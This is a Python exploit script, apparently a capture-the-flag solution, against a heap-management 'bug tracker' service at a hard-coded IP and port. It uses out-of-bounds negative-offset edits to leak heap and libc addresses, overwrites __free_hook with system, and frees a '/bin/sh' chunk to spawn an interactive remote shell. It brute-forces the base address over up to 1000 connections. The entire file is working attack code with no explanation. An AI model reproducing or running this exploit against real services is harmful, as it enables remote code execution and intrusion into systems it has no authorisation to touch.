import pwnbox,struct
unpack = lambda x : struct.unpack("<I",x)[0]
pack = lambda x: struct.pack("<I",x)
p = None

def connect():
    return pwnbox.pipe.SocketPipe("13.112.128.199",1337)

def send(n, flag=False):
    p.read_until(":")
    if not flag:
        return p.write(str(n)+"\n")
    return p.write(str(n))

def add_bug(name, size ,contents):
    for x in [1, name, size, contents]:
        send(x)

def view_bug():
    return send(2)

def edit_content(idx, offset, data):
    for x in [3, idx,3, offset, data]:
        send(x, x==data)
    p.read_until("+-----------------------------+")

def del_bug(idx, flag = True):
    for x in [4, idx]:
        send(x)
    if flag:
        p.read_until("+-----------------------------+")

def get_heap():
    edit_content(0,-0x13, "\x00\x00\x00\x38")
    view_bug()
    p.read_until("bug content : ")
    adr = p.read_byte(4)
    return unpack(adr)

def check():
    add_bug("TEST1",0x100,"A"*0xff)
    add_bug("TEST2",0x100,"B"*0xff)
    del_bug(1)
    edit_content(0,-0x13, "\x00\x00\x00\xb0")
    del_bug(0)

def go(base):
    target = base+0x300C
    edit_content(0, -0xc,pack(target))
    view_bug()
    p.read_until("==========================================")
    p.read_until("==========================================")
    p.read_until("==========================================\n")
    if "timeout" in  p.read_until("\n") : return
    p.read_until("bug idx : ")
    heap = int(p.read_until("\n"))
    print "HEAP : "+hex(heap)
    p.read_until("+-----------------------------+")
    del_bug(heap)
    free = leak(base+0x2FB0)
    print hex(free)
    libc  = free - free_offset
    hook = libc+ free_hook
    system = libc+ system_offset
    del_bug(heap)
    add_bug("TEST",0x10,"XXXX")
    edit_content(heap+1, -0x10,pack(hook))
    
    del_bug(heap)
    edit_content(heap+1, 0, pack(system))
    add_bug("/bin/sh",0x10,"/bin/sh")
    del_bug(heap+2,False)
    p.write("ls\n")

    p.interact()


def leak(adr):
    edit_content(0, -0x10,pack(adr))
    view_bug()
    p.read_until("content : ")
    ret = unpack(p.read_byte(4))
    p.read_until("+-----------------------------+")
    return ret

free_offset = 0x00070750
free_hook = 0x001b18b0
system_offset = 0x0003a940
base = 0x565b1000
for i in range(1000):
    p = connect()
    go(base)
